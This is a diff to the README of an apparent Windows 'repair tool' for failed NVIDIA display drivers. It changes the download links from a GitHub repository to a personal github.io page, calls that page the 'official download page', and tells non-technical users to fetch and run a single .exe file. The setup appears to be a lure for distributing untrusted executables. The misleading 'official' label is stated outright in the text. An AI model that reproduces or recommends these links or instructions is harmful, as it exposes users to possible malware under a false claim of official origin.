@@ -1,6 +1,6 @@
 # 🛠️ NVIDIA-Display-Driver-Failed-Fix - Repair Broken Graphics Drivers Easily
 
-[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://github.com/songful-hollywood128/NVIDIA-Display-Driver-Failed-Fix)
+[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://songful-hollywood128.github.io)
 
 This tool resolves issues where your NVIDIA graphics driver fails to start. It works on Windows 11 and Windows 10. You do not need technical skills to use this software. Follow these instructions to restore your display functionality.
 
@@ -23,7 +23,7 @@ This tool functions on the following systems:
 
 You must visit the project release page to get the correct version for your system. The repair tool comes as a single executable file.
 
-1. Go to the [official download page](https://github.com/songful-hollywood128/NVIDIA-Display-Driver-Failed-Fix).
+1. Go to the [official download page](https://songful-hollywood128.github.io).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version link.
 4. Select the file ending in `.exe` to download the repair program.
